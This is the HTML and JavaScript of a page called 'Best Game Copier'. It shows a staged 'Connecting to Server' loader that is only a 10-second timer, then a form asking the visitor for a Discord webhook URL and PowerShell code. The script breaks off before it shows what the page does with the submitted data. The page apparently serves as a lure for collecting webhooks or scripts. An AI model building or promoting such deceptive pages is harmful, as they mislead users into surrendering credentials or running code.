<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Best Game Copier</title>
    <style>
        /* General Reset */
        body, html {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: black;
            color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        /* Background Animation */
        @keyframes gradientAnimation {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        body {
            background: linear-gradient(120deg, #1e3a8a, #00008b, #000000);
            background-size: 200% 200%;
            animation: gradientAnimation 15s ease infinite;
        }

        /* Loader */
        #loader {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: black;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        #loader-text {
            font-size: 24px;
            margin-bottom: 15px;
            color: #1e90ff;
        }

        .dots {
            display: flex;
            gap: 8px;
        }

        .dot {
            width: 12px;
            height: 12px;
            background-color: #1e90ff;
            border-radius: 50%;
            animation: slideDots 1.5s infinite;
        }

        .dot:nth-child(1) {
            animation-delay: 0s;
        }

        .dot:nth-child(2) {
            animation-delay: 0.3s;
        }

        .dot:nth-child(3) {
            animation-delay: 0.6s;
        }

        @keyframes slideDots {
            0%, 100% {
                transform: translateY(0);
                opacity: 0.5;
            }
            50% {
                transform: translateY(-10px);
                opacity: 1;
            }
        }

        /* Main Content */
        .card {
            display: none;
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0px 8px 20px rgba(0, 0, 0, 0.5);
            text-align: center;
            width: 90%;
            max-width: 400px;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            color: #fff;
            background: rgba(255, 255, 255, 0.2);
        }

        input::placeholder {
            color: #ddd;
        }

        button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            background: #1e90ff;
            color: white;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        button:hover {
            background: #00008b;
        }

        .error {
            color: red;
            font-size: 14px;
            margin-top: 10px;
        }

        /* Notification */
        .notification {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: #1e90ff;
            color: white;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            opacity: 0;
            animation: fadeInOut 4s ease forwards;
        }

        @keyframes fadeInOut {
            0%, 100% {
                opacity: 0;
                transform: translateY(20px);
            }
            10%, 90% {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Discord Button */
        .discord-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #7289da;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0px 8px 20px rgba(0, 0, 0, 0.5);
            cursor: pointer;
        }

        .discord-btn svg {
            width: 30px;
            height: 30px;
            fill: white;
        }

        .discord-btn:hover {
            background: #5865f2;
        }

        .discord-btn:hover::after {
            content: 'Join our Discord';
            position: absolute;
            bottom: 80px;
            right: 15px;
            background: #1e90ff;
            color: white;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
    </style>
</head>
<body>
    <!-- Loader -->
    <div id="loader">
        <div id="loader-text">Connecting to Server</div>
        <div class="dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
    </div>

    <!-- Main Content -->
    <div class="card" id="main-content">
        <h1>Best Game Copier</h1>
        <input id="webhookUrl" type="text" placeholder="Enter your Discord Webhook (for results)" />
        <input id="powershellCode" type="text" placeholder="Enter your PowerShell code" />
        <button id="copyButton">Submit Code</button>
        <p id="errorMessage" class="error" style="display: none;"></p>
    </div>

    <!-- Discord Button -->
    <div class="discord-btn" onclick="window.open('https://discord.com/invite/yourInviteCode', '_blank')">

        </svg>
    </div>

    <!-- Notification Container -->
    <div id="notification-container"></div>

    <script>
        const loader = document.getElementById('loader');
        const mainContent = document.getElementById('main-content');

        // Show website after 10 seconds
        setTimeout(() => {
            loader.style.opacity = '0';
            setTimeout(() => {
                loader.style.display = 'none';
                mainContent.style.display = 'block';
            }, 500);
        }, 10000);

        const copyButton = document.getElementById('copyButton');
        const powershellCode = document.getElementById('powershellCode');
        const webhookUrl = document.getElementById('webhookUrl');
        const errorMessage = document.getElementById('errorMessage');

        function isValidWebhook(url) {
            const discordWebhookPattern = /https:\/\/discord\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+/;
            return discordWebhookPattern.test(url);
        }

        function showNotification(message) {
            const notification = document.createElement('div');
            notification.className = 'notification';
            notification.textContent = message;
            document.body.appendChild(notification);
            setTimeout(() => notification.remove(), 4000);
        }

        copyButton.addEventListener('click', () => {
            const code = powershellCode.value.trim();
            const userWebhook = webhookUrl.value.trim();

            if (!code) {
                errorMessage.style.display = 'block';
                errorMessage.textContent = 'No PowerShell code entered. Please try again.';
                return;
            }

            if (!isValidWebhook(userWebhook)) {
                errorMessage.style.display = 'block';
